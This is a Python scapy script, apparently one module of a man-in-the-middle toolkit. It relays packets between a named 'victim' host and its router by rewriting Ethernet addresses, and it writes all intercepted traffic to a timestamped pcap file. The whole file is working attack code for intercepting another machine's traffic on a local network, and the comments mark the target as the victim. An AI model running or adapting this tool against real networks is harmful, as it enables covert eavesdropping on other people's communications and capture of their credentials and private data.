import scapy.all as scapy
from scapy.all import IP, Ether
from scapy.all import PcapWriter, sniff
from datetime import datetime
ip_forward_v = 2.0

import sys, os
sys.path.append(os.path.join('..','..'))
from config import Success, Clear
from functions import validate_args

ip_dst = ''
eth_dst = ''
ip_src = ''
eth_src = ''
iface = scapy.conf.iface
my_ip = scapy.get_if_addr(iface)
my_eth = scapy.get_if_hwaddr(iface)

def addr_spoof(packet):
    global ip_dst, eth_dst, ip_src, eth_src, iface
    #Norm 192.168.100.8:dst_eth   ->   23.23.23.23:src_eth 
    #Norm 23.23.23.23:src_eth     ->   192.168.100.1:dst_eth
    
    #Spof 192.168.100.8:dst_eth   ->   23.23.23.23:my_eth
    #Spof 23.23.23.23:my_eth      ->   192.168.100.1:dst_eth
    if packet.haslayer(IP) and packet.haslayer(Ether):
        
        # Пакет ОТ жертвы -> отправляем на роутер
        if packet[Ether].src == eth_dst and packet[Ether].dst == my_eth:
            packet[Ether].dst = eth_src
            scapy.sendp(packet, iface=iface, verbose=0)
            print(f"[->] {packet[IP].src} -> {packet[IP].dst} (переслано на роутер)")

        # Пакет К жертве -> отправляем жертве
        elif packet[IP].dst == ip_dst and packet[Ether].dst == my_eth:
            packet[Ether].dst = eth_dst
            packet[Ether].src = my_eth
            scapy.sendp(packet, iface=iface, verbose=0)
            print(f"[<-] {packet[IP].src} -> {packet[IP].dst} (переслано жертве)")

def ip_forward(args):
    global ip_dst, eth_dst, ip_src, eth_src
    if not validate_args(ip_dst=args['ip_dst'], eth_dst=args['eth_dst'], ip_src=args['ip_src'], eth_src=args['eth_src']): return False
    ip_dst = args['ip_dst']
    eth_dst = args['eth_dst']
    ip_src = args['ip_src']
    eth_src = args['eth_src']
    
    
    
    
    now = datetime.now()
    filename = f'ip_forwarding_{now.strftime("%Y%m%d_%H%M%S")}.pcap'
    
    try:
        pcap_writer = PcapWriter(filename=filename, append=False, sync=True)
    except Exception:
        filename = f'ip_forwarding_{now.strftime("%Y%m%d_%H%M%S")}.pcap'
        pcap_writer = PcapWriter(filename=filename, append=False, sync=True)
    
    print(f"IP forwarding, version: {ip_forward_v}")
    print('*IP forwarding started')
    print(f'Router: {ip_src}_{eth_src}')
    print(f'Victim: {ip_dst}_{eth_dst}')
    
    forwarded_packets = scapy.sniff(filter='ip', prn=addr_spoof, store=True, iface=args['iface'])
    pcap_writer.write(forwarded_packets)
    print(f'\n{Success}Traffic was writted in \'{filename}\'{Clear}')

if __name__ == '__main__':
    
    import argparse
    parser = argparse.ArgumentParser(description=f"IP forwarding module. Version: {ip_forward_v}")
    parser.add_argument("--ip_dst", "-id", help="Destination IP address (target 2).", required=True)
    parser.add_argument("--eth_dst", "-ed", help="Destination MAC address (target 2).", required=True)
    parser.add_argument("--ip_src", "-is", help="Sender IP address (target 1).", required=True)
    parser.add_argument("--eth_src", "-es", help="Sender MAC address (target 1).", required=True)
    parser.add_argument("-i", "--iface", help="Network iface to send from.", required=False)

    arg = parser.parse_args()
    args = {}
    args['ip_dst'] = arg.ip_dst
    args['eth_dst'] = arg.eth_dst
    args['ip_src'] = arg.ip_src
    args['eth_src'] = arg.eth_src
    args['iface'] = arg.iface
    ip_forward(args)
